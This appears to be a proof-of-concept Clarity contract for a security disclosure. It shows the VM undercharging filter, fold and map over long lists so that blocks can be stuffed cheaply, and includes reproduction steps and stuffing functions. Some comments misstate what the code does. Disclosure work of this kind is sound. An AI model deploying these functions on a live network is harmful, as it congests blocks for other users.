;;
;; PoC: Clarity VM cost_filter / cost_fold / cost_map underpricing
;;
;; Bug: runtime_cost(ClarityCostFunction::Filter, exec_state, 0)
;;      passes 0 instead of the actual sequence length.
;;      The boot contract's cost_filter(n) returns constant u1000
;;      regardless of n -- so even if n were passed correctly, the
;;      cost would still be flat.
;;
;; Same for fold.  map passes args.len() (~2) instead of list length.
;;
;; Impact: block stuffing at artificially low cost.
;;
;; Severity: Smart Contract Medium
;;   "Any block stuffing without fund transfers being blocked"
;;
;; Reproduction:
;;   clarinet console
;;   (contract-call? .cost-stuffing filter-small)
;;   (contract-call? .cost-stuffing filter-large)
;;   Compare runtime costs in the receipts.
;;

;; --- trivial predicates / reducers --------------------------------

(define-private (always-true (x int))
  true)

(define-private (add-one (x int) (acc int))
  (+ acc 1))

(define-private (identity (x int))
  x)

;; --- FILTER: cost is flat 1000 regardless of list size -----------

;; 2 elements -> runtime ~ 1000 (filter) + 2x~1000 (predicate) = ~3000
(define-public (filter-small)
  (begin
    (filter always-true (list 1 2))
    (ok true)))

;; 64 elements -> runtime ~ 1000 (filter) + 64x~1000 (predicate) = ~65000
;; BUT: the filter operation itself is still 1000, not 64000
(define-public (filter-medium)
  (begin
    (filter always-true
      (list 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16
            17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32
            33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48
            49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64))
    (ok true)))

;; 128 elements -> runtime ~ 1000 (filter) + 128x~1000 (predicate) = ~129000
;; filter line item: still 1000 -- 128x undercharged
(define-public (filter-large)
  (begin
    (filter always-true
      (list 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16
            17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32
            33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48
            49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64
            65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80
            81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96
            97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112
            113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128))
    (ok true)))

;; --- FOLD: same flat cost ----------------------------------------

;; fold over 2 elements
(define-public (fold-small)
  (begin
    (fold add-one (list 1 2) 0)
    (ok true)))

;; fold over 128 elements -- same fold cost (1000), 128x more work
(define-public (fold-large)
  (begin
    (fold add-one
      (list 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16
            17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32
            33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48
            49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64
            65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80
            81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96
            97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112
            113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128)
      0)
    (ok true)))

;; --- MAP: scales with arg count, not list length -----------------

;; map over 2 elements -- cost_map(1) ~ 2000, should be cost_map(2)
(define-public (map-small)
  (begin
    (map identity (list 1 2))
    (ok true)))

;; map over 128 elements -- cost_map(1) ~ 2000, should be cost_map(128) ~ 129000
(define-public (map-large)
  (begin
    (map identity
      (list 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16
            17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32
            33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48
            49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64
            65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80
            81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96
            97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112
            113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128))
    (ok true)))

;; --- COMPOUND: nested calls amplify the undercharge --------------

;; Chain filter -> fold -> map in one call
;; Total filter+fold+map overhead charged: ~3000 (3 x 1000)
;; Actual work: 128 filter iterations + 128 fold iterations + 128 map iterations = 384 iterations
(define-public (compound-stuffing)
  (let
    ((big-list (list 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16
                     17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32
                     33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48
                     49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64))
     (filtered (filter always-true big-list))
     (folded (fold add-one filtered 0))
     (mapped (map identity big-list)))
    (ok { filtered-len: (len filtered),
          fold-result: folded,
          mapped-len: (len mapped) })))

;; --- BLOCK STUFFING DEMO -----------------------------------------

;; Call filter-large 5 times in one tx -- shows how cheap it is
;; to consume significant VM cycles
(define-public (stuff-demo)
  (begin
    (filter always-true (list 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32))
    (filter always-true (list 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32))
    (filter always-true (list 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32))
    (filter always-true (list 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32))
    (filter always-true (list 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32))
    (ok true)))
